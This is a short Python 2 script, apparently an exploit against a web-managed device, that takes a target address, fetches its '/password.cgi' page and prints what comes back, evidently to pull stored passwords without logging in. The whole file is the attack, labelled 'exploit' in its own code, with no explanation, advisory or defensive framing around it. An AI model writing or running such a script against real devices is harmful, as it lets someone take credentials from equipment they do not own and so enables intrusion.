#!/usr/bin/python
import os #/* Import os */
import sys #/* Import sys */
import urllib #/* Import urllib*/

#/* Give Warning */
def warning():
    print "If wait longer than 1minute ctrl-c"

#/* Action */
def main():
	target = sys.argv[1]
	exploit = urllib.urlopen("%s/password.cgi" % (target))
	drop = exploit.read()
	print drop

warning() #/* Warning Ended */
main() #/* Action Ended */